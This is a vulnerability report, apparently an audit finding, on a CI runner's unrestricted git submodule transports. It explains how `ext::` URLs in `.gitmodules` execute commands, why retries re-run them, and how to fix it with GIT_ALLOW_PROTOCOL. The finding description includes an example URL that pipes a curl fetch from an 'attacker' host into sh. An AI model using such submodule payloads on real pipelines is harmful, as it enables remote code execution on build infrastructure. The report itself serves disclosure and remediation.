### Title
Unrestricted git submodule URL transports allow `ext::`/`file::` command execution, executed identically on both the initial and inner-retry `git submodule update` calls - ([File: functions/concrete/run/stages/get_sources.go])

### Summary
`doSubmoduleUpdate` invokes `git submodule update --init` with attacker-influenced `SubmoduleUpdateFlags` and no `protocol.allow`/`GIT_ALLOW_PROTOCOL` restriction, so a `.gitmodules` entry using an `ext::` URL executes an arbitrary host command as the git-invoking process. Because the same unguarded call is issued again in the inner `Retrying...` branch after a failure, the payload runs a second time, but this only matters as an amplification of an already-successful first-attempt code execution, not as a distinct bypass unique to retries.

### Finding Description
`doSubmoduleUpdate` builds `updateArgs` from `s.SubmoduleUpdateFlags` (sourced verbatim from the job variable `GIT_SUBMODULE_UPDATE_FLAGS`, split on whitespace with no allow-list) and runs `git(ctx, e, extraEnv, withCreds(updateArgs)...)` [3](#0-2) . Neither this call nor any other git invocation in this file, nor anywhere else in the repo, sets `protocol.ext.allow=never`/`protocol.file.allow=never` or `GIT_ALLOW_PROTOCOL`; a grep across the whole repository found no such restriction. A `.gitmodules` file committed by the pipeline author (who fully controls the CI ref/repo content) can declare a submodule URL like `ext::sh -c "curl attacker | sh"`, and native git — with no runner-side transport allow-list — will execute it as soon as `git submodule update --init` reaches that submodule, i.e., on the very first attempt at line 782, before any retry logic runs. If that first invocation fails for the attacker's own submodule (or is intentionally made to fail, e.g. by exiting non-zero after doing its work) or for any unrelated reason, the same unguarded command is invoked again in the `Retrying...` branch at line 790, re-executing the `ext::` payload a second time [4](#0-3) . The outer `GetSources.Run` backoff loop (`retry.NewBackoff()` / `s.MaxAttempts`) can add further repetitions on top of that if `getSourcesOnce` itself returns an error [5](#0-4) . However, the "double execution via retry" framing in the question overstates the retry's role: the root cause is that transport restriction is absent unconditionally, not that a check exists on the first attempt and is skipped only on retry. Command execution as the git-invoking process already occurs on attempt one.

### Impact Explanation
Concrete impact: arbitrary host command execution as the process running the bundled git binary (the runner/job's git-invocation context), triggerable purely by an unprivileged pipeline author who can commit a `.gitmodules` file and set `GIT_SUBMODULE_UPDATE_FLAGS`/`GIT_SUBMODULE_STRATEGY=normal|recursive` as job variables. The retry path increases the number of times the payload runs (up to 2x from the inner retry, multiplied further by outer `MaxAttempts`), which could matter for a race/TOCTOU against cleanup logic, but the scoped "two chances to win a race" claim is speculative beyond confirming repeated execution — no specific runner cleanup race window was identified in this codebase that the second execution would exploit differently than the first.

### Likelihood Explanation
High feasibility and fully attacker-controlled: requires only `GIT_SUBMODULE_STRATEGY=normal` (or `recursive`), a malicious `.gitmodules` in the CI ref, and optionally `GIT_SUBMODULE_UPDATE_FLAGS=--remote` — all settable via ordinary `.gitlab-ci.yml`/pipeline variables by any project member able to run a pipeline. No admin privilege or special runner configuration is needed, and the vulnerable code path (`GetSources.Run` → `getSourcesOnce` → `updateSubmodules` → `doSubmoduleUpdate`) is reached on every job using submodules.

### Recommendation
Add a transport allow-list before every `git` invocation that can touch submodule URLs (both the initial and inner-retry calls in `doSubmoduleUpdate`, as well as `gitFetch`/`gitClone`/`gitInit`): set `GIT_ALLOW_PROTOCOL=file:git:http:https:ssh` (or the equivalent `-c protocol.ext.allow=never -c protocol.file.allow=never` config passed via `extraEnv`/`configArgs`) so `ext::` and `file::`-style submodule URLs are rejected by git itself, regardless of which attempt (first, inner retry, or outer backoff retry) invokes it.

### Proof of Concept
Go test plan in `functions/concrete/run/stages/get_sources_test.go`:
1. Create a temp bare "attacker" repo whose `.gitmodules` defines a submodule with URL `ext::sh -c "touch /tmp/glr-pwned-$$"`.
2. Configure `GetSources{SubmoduleStrategy: "normal", SubmoduleUpdateFlags: []string{"--remote"}, ...}` pointing at that repo/ref.
3. Run `GetSources.Run`; assert the marker file is created (proving `ext::` execution) and, by forcing the first `submodule update` to fail (e.g., a second bogus submodule), assert two marker files are created (`-pwned-1`, `-pwned-2` via a counter script) confirming double execution through the `Retrying...` branch.
4. Regression assertion: after adding `GIT_ALLOW_PROTOCOL`/`protocol.ext.allow=never`, assert `git` invocation fails with a protocol-not-allowed error and no marker file is created on either attempt.
